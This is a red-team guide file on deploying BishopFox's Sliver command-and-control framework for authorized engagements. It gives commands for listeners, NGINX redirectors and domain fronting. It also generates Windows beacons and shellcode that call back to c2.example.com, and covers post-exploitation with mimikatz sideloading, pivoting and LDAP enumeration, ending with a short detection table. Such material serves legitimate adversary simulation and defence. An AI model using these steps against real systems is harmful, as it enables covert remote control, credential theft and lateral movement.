---
name: building-c2-infrastructure-with-sliver-framework
description: Build and configure a resilient command-and-control infrastructure using BishopFox's Sliver C2 framework with redirectors, HTTPS listeners, and multi-operator support for authorized red team engagements.
domain: cybersecurity
subdomain: red-teaming
tags: [red-team, c2-framework, sliver, command-and-control, adversary-simulation, infrastructure, post-exploitation]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Building C2 Infrastructure with Sliver Framework

## Overview

Sliver is an open-source, cross-platform adversary emulation framework developed by BishopFox, written in Go. It provides red teams with implant generation, multi-protocol C2 channels (mTLS, HTTP/S, DNS, WireGuard), multi-operator support, and extensive post-exploitation capabilities. Sliver supports beacon (asynchronous) and session (interactive) modes, making it suitable for both long-haul operations and interactive exploitation. A properly architected Sliver infrastructure uses redirectors, domain fronting, and HTTPS certificates to maintain operational resilience and avoid detection.

## Objectives

- Deploy a Sliver team server on hardened cloud infrastructure
- Configure HTTPS, mTLS, DNS, and WireGuard listeners
- Generate implants (beacons and sessions) for target platforms
- Set up NGINX or Apache redirectors between implants and the team server
- Implement Cloudflare or CDN-based domain fronting for traffic obfuscation
- Configure multi-operator access with certificate-based authentication
- Establish operational security controls for C2 communications

## MITRE ATT&CK Mapping

- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1071.004** - Application Layer Protocol: DNS
- **T1573.002** - Encrypted Channel: Asymmetric Cryptography
- **T1090.002** - Proxy: External Proxy (Redirectors)
- **T1105** - Ingress Tool Transfer
- **T1132.001** - Data Encoding: Standard Encoding
- **T1572** - Protocol Tunneling

## Implementation Steps

### Phase 1: Team Server Deployment
1. Provision a VPS (e.g., DigitalOcean, Linode, AWS EC2) for the team server
2. Harden the OS: disable SSH password auth, configure UFW/iptables, install fail2ban
3. Install Sliver using the official install script:
   ```bash
   curl https://sliver.sh/install | sudo bash
   ```
4. Start the Sliver server daemon:
   ```bash
   systemctl start sliver
   # Or run interactively
   sliver-server
   ```
5. Generate operator configuration files for team members:
   ```bash
   new-operator --name operator1 --lhost <team-server-ip>
   ```

### Phase 2: Listener Configuration
1. Configure an HTTPS listener with a legitimate SSL certificate:
   ```bash
   https --lhost 0.0.0.0 --lport 443 --domain c2.example.com --cert /path/to/cert.pem --key /path/to/key.pem
   ```
2. Configure a DNS listener for fallback C2:
   ```bash
   dns --domains c2dns.example.com --lport 53
   ```
3. Configure mTLS listener for high-security sessions:
   ```bash
   mtls --lhost 0.0.0.0 --lport 8888
   ```
4. Configure WireGuard listener for tunneled access:
   ```bash
   wg --lport 51820
   ```

### Phase 3: Redirector Setup
1. Deploy a separate VPS as a redirector (positioned between targets and team server)
2. Install and configure NGINX as a reverse proxy:
   ```nginx
   server {
       listen 443 ssl;
       server_name c2.example.com;
       ssl_certificate /etc/letsencrypt/live/c2.example.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/c2.example.com/privkey.pem;

       location / {
           proxy_pass https://<team-server-ip>:443;
           proxy_ssl_verify off;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
       }
   }
   ```
3. Configure iptables rules on the team server to only accept connections from the redirector:
   ```bash
   iptables -A INPUT -p tcp --dport 443 -s <redirector-ip> -j ACCEPT
   iptables -A INPUT -p tcp --dport 443 -j DROP
   ```
4. Optionally set up Cloudflare as a CDN layer in front of the redirector for domain fronting

### Phase 4: Implant Generation
1. Generate an HTTPS beacon implant:
   ```bash
   generate beacon --http https://c2.example.com --os windows --arch amd64 --format exe --name payload
   ```
2. Generate a DNS beacon for restricted networks:
   ```bash
   generate beacon --dns c2dns.example.com --os windows --arch amd64
   ```
3. Generate a shellcode payload for injection:
   ```bash
   generate --http https://c2.example.com --os windows --arch amd64 --format shellcode
   ```
4. Configure beacon jitter and callback intervals:
   ```bash
   generate beacon --http https://c2.example.com --seconds 60 --jitter 30
   ```

### Phase 5: Post-Exploitation Operations
1. Interact with active beacons/sessions:
   ```bash
   beacons        # List active beacons
   use <beacon-id> # Interact with a beacon
   ```
2. Execute post-exploitation modules:
   ```bash
   ps              # Process listing
   netstat         # Network connections
   execute-assembly /path/to/Seatbelt.exe -group=all  # Run .NET assemblies
   sideload /path/to/mimikatz.dll  # Load DLLs
   ```
3. Set up pivots for internal network access:
   ```bash
   pivots tcp --bind 0.0.0.0:9898  # Create pivot listener on compromised host
   ```
4. Use BOF (Beacon Object Files) for in-memory execution:
   ```bash
   armory install sa-ldapsearch  # Install from armory
   sa-ldapsearch -- "(objectClass=user)"  # Execute BOF
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| Sliver Server | C2 team server and implant management | Linux/macOS/Windows |
| Sliver Client | Operator console for team members | Cross-platform |
| NGINX | Redirector and reverse proxy | Linux |
| Certbot | Let's Encrypt SSL certificate generation | Linux |
| Cloudflare | CDN and domain fronting | Cloud |
| Armory | Sliver extension/BOF package manager | Built-in |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| Default Sliver HTTP headers | Network traffic analysis for unusual User-Agent strings |
| mTLS on non-standard ports | Firewall logs for outbound connections to unusual ports |
| DNS TXT record queries with high entropy | DNS log analysis for encoded C2 traffic |
| WireGuard UDP traffic on port 51820 | Network flow analysis for WireGuard handshake patterns |
| Sliver implant file hashes | EDR/AV signature matching against known Sliver samples |

## Validation Criteria

- [ ] Team server deployed and hardened with firewall rules
- [ ] HTTPS listener configured with valid SSL certificate
- [ ] DNS listener configured as fallback C2 channel
- [ ] At least one redirector deployed between targets and team server
- [ ] Multi-operator access configured with unique certificates
- [ ] Implants generated for target operating systems
- [ ] Beacon callback intervals and jitter configured for stealth
- [ ] Post-exploitation modules tested (process listing, .NET assembly execution)
- [ ] Pivot functionality validated for internal network access
- [ ] All C2 traffic encrypted and passing through redirectors
